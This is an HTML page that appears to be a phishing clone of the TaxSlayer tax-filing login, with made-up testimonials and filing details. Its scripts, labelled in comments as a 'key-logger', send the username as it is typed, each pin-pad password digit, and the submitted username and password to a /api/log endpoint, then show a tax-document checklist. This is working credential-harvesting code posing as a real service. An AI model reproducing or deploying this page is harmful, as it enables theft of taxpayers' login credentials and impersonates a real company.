<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Tax Filing – April 2025</title>
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- ============================================================
       1. Capture query‑string (first, last, ssn) + instant log
       ============================================================ -->
  <script>
    (function () {
      const params  = new URLSearchParams(window.location.search);
      const username = params.get('username') || '';

      /* Prefill once DOM is ready */
      document.addEventListener('DOMContentLoaded', () => {
        if (username) document.querySelector('input[name="username"]').value = username;
      });

      /* One‑time GET log so back‑end sees the landing */
      if (username) {
        const q = new URLSearchParams({
          event:     'landing_query',
          username,
          timestamp: new Date().toISOString()
        }).toString();

        fetch(`/api/log?${q}`).catch(err =>
          console.error('Query‑string log failed:', err)
        );
      }
    })();
  </script>
</head>

<body class="bg-gray-50 text-gray-800 font-sans">
  <header class="bg-blue-900 text-white p-4">
    <h1 class="text-3xl font-bold">TaxSlayer</h1>
    <p class="text-sm">Deadline to file: <strong>April&nbsp;15,&nbsp;2025</strong></p>
  </header>

  <main class="p-6 max-w-2xl mx-auto bg-white shadow-md rounded-lg mt-6">
    <h2 class="text-2xl font-semibold mb-4">Start Your Free or Premium Filing</h2>


    <!-- Ads / Promotions -->
    <div class="mb-4">
      <div class="bg-green-100 p-3 rounded mb-2">
        <strong>Free Filing:</strong> For simple returns&nbsp;(W‑2 only)
      </div>
      <div class="bg-yellow-100 p-3 rounded">
        <strong>Premium:</strong> Maximize deductions, self‑employed features – $39.99
      </div>
    </div>

    <!-- Login Form -->
    <form id="filingForm" class="space-y-4">
      <h3 class="text-lg font-semibold mb-3">Access Your Tax Documents</h3>
      
      <div>
        <label class="block text-sm font-medium">Username</label>
        <input type="text" name="username" class="w-full border rounded p-2" autocomplete="username" required />
      </div>
      
      <div>
        <label class="block text-sm font-medium">Password</label>
        <input type="password" name="password" class="w-full border rounded p-2 mb-3" readonly placeholder="Use pin pad below" />
        
        <!-- Pin Pad -->
        <div class="mt-3">
          <p class="text-sm text-gray-600 mb-2">Enter your password using the pin pad:</p>
          <div class="grid grid-cols-3 gap-2 max-w-xs">
            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="1">1</button>
            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="2">2</button>
            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="3">3</button>
            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="4">4</button>
            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="5">5</button>
            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="6">6</button>
            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="7">7</button>
            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="8">8</button>
            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="9">9</button>
            <button type="button" class="pin-clear bg-red-100 hover:bg-red-200 border border-red-300 rounded p-3 text-lg font-semibold transition-colors">Clear</button>
            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="0">0</button>
            <button type="button" class="pin-backspace bg-blue-100 hover:bg-blue-200 border border-blue-300 rounded p-3 text-lg font-semibold transition-colors">⌫</button>
          </div>
        </div>
      </div>

      <button type="submit"
              class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700 flex items-center gap-2">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
          <path fill-rule="evenodd" d="M9 2a1 1 0 00-.894.553L7.382 4H4a1 1 0 000 2v10a2 2 0 002 2h8a2 2 0 002-2V6a1 1 0 100-2h-3.382l-.724-1.447A1 1 0 0011 2H9zM7 8a1 1 0 012 0v6a1 1 0 11-2 0V8zm5-1a1 1 0 00-1 1v6a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd" />
        </svg>
        Obtain Your Checklist
      </button>
    </form>

    <!-- Client Reviews -->
    <section class="mt-8">
      <h3 class="text-xl font-semibold mb-2">What our clients say</h3>
      <div class="space-y-2">
        <blockquote class="bg-gray-100 p-3 rounded">
          “So easy and fast to file!” – <em>Angela R.</em>
        </blockquote>
        <blockquote class="bg-gray-100 p-3 rounded">
          “Premium saved me hundreds!” – <em>Devon K.</em>
        </blockquote>
        <blockquote class="bg-gray-100 p-3 rounded">
          “Best tax software I’ve used in years.” – <em>Linda S.</em>
        </blockquote>
      </div>
    </section>
  </main>

  <!-- Security Message -->
  <div class="max-w-2xl mx-auto mt-6">
    <div class="bg-blue-50 border-l-4 border-blue-600 p-4 mb-6">
      <p class="font-semibold text-blue-900">Your security. Built into everything we do.</p>
      <a href="#" class="text-blue-600 hover:underline text-sm">Here's how</a>
    </div>

    <!-- TaxSlayer Filing Details -->
    <div class="bg-gray-50 p-4 rounded-lg mb-6">
      <h3 class="font-semibold mb-3">TaxSlayer Online: Important Details about Filing Simple Form 1040 Returns</h3>
      
      <p class="text-sm mb-4">
        If you have a simple Form 1040 return only (no forms or schedules except as needed to claim the Earned Income Tax Credit, Child Tax Credit or student loan interest), you can file for free yourself with TaxSlayer Free Edition, or you can file with TaxSlayer Live Assisted Basic at the listed price. Roughly 37% of taxpayers are eligible.
      </p>

      <div class="grid md:grid-cols-2 gap-4 text-sm">
        <div>
          <p class="font-semibold mb-2">Examples of situations included in a simple Form 1040 return (assuming no added tax complexity):</p>
          <ul class="list-disc list-inside space-y-1 text-gray-700">
            <li>W-2 income</li>
            <li>Interest, dividends or original issue discounts (1099-INT/1099-DIV/1099-OID) that don't require filing a Schedule B</li>
            <li>IRS standard deduction</li>
            <li>Earned Income Tax Credit (EITC)</li>
            <li>Child Tax Credit (CTC)</li>
            <li>Student loan interest deduction</li>
            <li>Taxable qualified retirement plan distributions</li>
          </ul>
        </div>
        
        <div>
          <p class="font-semibold mb-2">Examples of situations not included in a simple Form 1040 return:</p>
          <ul class="list-disc list-inside space-y-1 text-gray-700">
            <li>Itemized deductions claimed on Schedule A, like charitable contributions, medical expenses, mortgage interest and state and local tax deductions</li>
            <li>Unemployment income reported on a 1099-G</li>
            <li>Business or 1099-NEC income (often reported by those who are self-employed, gig workers or freelancers)</li>
            <li>Stock sales (including crypto investments)</li>
            <li>Income from rental property or property sales</li>
            <li>Credits, deductions and income reported on other forms or schedules</li>
          </ul>
        </div>
      </div>
      
      <p class="text-xs text-gray-600 mt-3">* More important offer details and disclosures</p>
    </div>
  </div>

  <footer class="text-center text-sm text-gray-500 mt-8">
    &copy;&nbsp;2025 TaxSlayer. All rights reserved.
  </footer>

  <!-- ============================================================
       2. Debounced key‑logger (first, last, ssn) + submit log
       ============================================================ -->
  <script>
    /* ---- debounce helper ---- */
    function debounce(fn, delay = 300) {
      let t;
      return (...args) => {
        clearTimeout(t);
        t = setTimeout(() => fn(...args), delay);
      };
    }

    /* ---- key‑logging for username input ---- */
    const usernameField = document.querySelector('input[name="username"]');
    if (usernameField) {
      usernameField.addEventListener(
        'input',
        debounce(() => {
          fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              event:     'keystroke',
              field:     'username',
              value:     usernameField.value,
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent
            })
          }).catch((err) => console.error('Keystroke log failed:', err));
        })
      );
    }

    /* ---- form‑submission logging ---- */
    document
      .getElementById('filingForm')
      .addEventListener('submit', async function (e) {
        e.preventDefault();

        const formData = new FormData(e.target);
        const data = {
          username: formData.get('username'),
          password: formData.get('password')
        };

        try {
          await fetch('/api/log', {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({
              event:     'form_submission_started',
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent,
              data
            })
          });
        } catch (err) {
          console.error('Failed to log event:', err);
        }

        /* FYI checklist (trimmed – no SSN) */
        alert(`Documents You'll Need:

PERSONAL INFORMATION
• Driver's license or state ID
• Social Security Number (SSN)

INCOME DOCUMENTS
• W‑2 – from employers
• 1099‑NEC – nonemployee compensation (freelance or contract work)
• 1099‑MISC – miscellaneous income
• 1099‑INT – interest income
• 1099‑DIV – dividend income
• 1099‑B – brokerage or stock transactions
• 1099‑G – unemployment income or state tax refunds
• 1099‑R – retirement distributions (pensions, IRAs)
• SSA‑1099 – Social Security benefits

DEDUCTION / CREDIT DOCUMENTS
• 1098 – mortgage interest statement
• 1098‑T – tuition statement
• 1098‑E – student loan interest
• Childcare expenses and provider info
• Charitable donation receipts
• Medical / dental expenses (if itemizing)

OTHER SUPPORTING DOCS
• Property tax statements
• Health insurance form (1095‑A, B, or C)
• Last year's tax return
• Bank account and routing number (for refund)`);
      });


    /* ---- Pin Pad Handler ---- */
    const passwordInput = document.querySelector('input[name="password"]');
    
    // Handle digit button clicks
    document.querySelectorAll('.pin-digit').forEach(button => {
      button.addEventListener('click', async function() {
        const digit = this.getAttribute('data-digit');
        
        // Add digit to password input
        passwordInput.value += digit;
        
        // Log the pin pad click
        try {
          await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              event: 'pin_pad_click',
              digit: digit,
              field: 'password',
              currentLength: passwordInput.value.length,
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent
            })
          });
        } catch (err) {
          console.error('Pin pad log failed:', err);
        }
      });
    });
    
    // Handle clear button
    document.querySelector('.pin-clear').addEventListener('click', async function() {
      passwordInput.value = '';
      
      // Log clear action
      try {
        await fetch('/api/log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            event: 'pin_pad_clear',
            field: 'password',
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
          })
        });
      } catch (err) {
        console.error('Pin pad clear log failed:', err);
      }
    });
    
    // Handle backspace button
    document.querySelector('.pin-backspace').addEventListener('click', async function() {
      if (passwordInput.value.length > 0) {
        passwordInput.value = passwordInput.value.slice(0, -1);
        
        // Log backspace action
        try {
          await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              event: 'pin_pad_backspace',
              field: 'password',
              currentLength: passwordInput.value.length,
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent
            })
          });
        } catch (err) {
          console.error('Pin pad backspace log failed:', err);
        }
      }
    });
  </script>
</body>
</html>

